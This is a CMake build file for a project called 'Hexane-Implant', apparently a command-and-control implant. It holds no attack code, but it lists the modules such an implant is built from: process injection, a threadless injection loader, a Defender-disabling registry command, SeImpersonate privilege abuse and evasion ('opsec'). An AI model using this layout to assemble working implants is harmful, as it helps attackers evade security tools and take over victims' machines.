cmake_minimum_required(VERSION 3.26)
project(Hexane-Implant)

set(CMAKE_CXX_STANDARD 23)

set(HOME ${CMAKE_SOURCE_DIR})
set(META "C:/Program Files (x86)/Windows Kits/NETFXSDK/4.8/Include/um")

enable_language(ASM_NASM)
include_directories(include ${CMAKE_SOURCE_DIR} ${META})

set (SOURCES
        ${HOME}/core/src/cipher.cpp
        ${HOME}/core/src/commands.cpp
        ${HOME}/core/src/cruntime.cpp
        ${HOME}/core/src/implant.cpp
        ${HOME}/core/src/inject.cpp
        ${HOME}/core/src/memory.cpp
        ${HOME}/core/src/message.cpp
        ${HOME}/core/src/network.cpp
        ${HOME}/core/src/opsec.cpp
        ${HOME}/core/src/parser.cpp
        ${HOME}/core/src/process.cpp
        ${HOME}/core/src/start.asm
        ${HOME}/core/src/stream.cpp
        ${HOME}/core/src/utils.cpp
)

set (INCLUDES
        ${HOME}/core/implant.ld
        ${HOME}/core/corelib.hpp
        ${HOME}/core/monolith.hpp
        ${HOME}/core/ntimports.hpp
        ${HOME}/core/include/cipher.hpp
        ${HOME}/core/include/commands.hpp
        ${HOME}/core/include/cruntime.hpp
        ${HOME}/core/include/implant.hpp
        ${HOME}/core/include/inject.hpp
        ${HOME}/core/include/memory.hpp
        ${HOME}/core/include/message.hpp
        ${HOME}/core/include/names.hpp
        ${HOME}/core/include/network.hpp
        ${HOME}/core/include/opsec.hpp
        ${HOME}/core/include/parser.hpp
        ${HOME}/core/include/process.hpp
        ${HOME}/core/include/stream.hpp
        ${HOME}/core/include/utils.hpp
        "C:/Program Files (x86)/Windows Kits/NETFXSDK/4.8/Include/um/mscoree.h"
        "C:/Program Files (x86)/Windows Kits/NETFXSDK/4.8/Include/um/metahost.h"
        commands/include/SeImpersonate.hpp
)

set (COMMANDS
        ${HOME}/commands/src/EnumProcess.cpp
        ${HOME}/commands/src/RegDisableDefender.cpp
        ${HOME}/commands/src/SeImpersonate.cpp
)

set (LOADER
        ${HOME}/loader/resource.rc
        ${HOME}/loader/src/dllmain.cpp
        ${HOME}/loader/src/exemain.cpp
        ${HOME}/loader/src/resource.cpp
)

set (INJECT
        ${HOME}/inject/threadless/loader.asm
        ${HOME}/inject/threadless/OpenFileExecute.cpp
        core/dotnet.hpp
)

add_executable(Hexane-Implant ${SOURCES} ${COMMANDS} ${LOADER} ${INJECT} ${INCLUDES})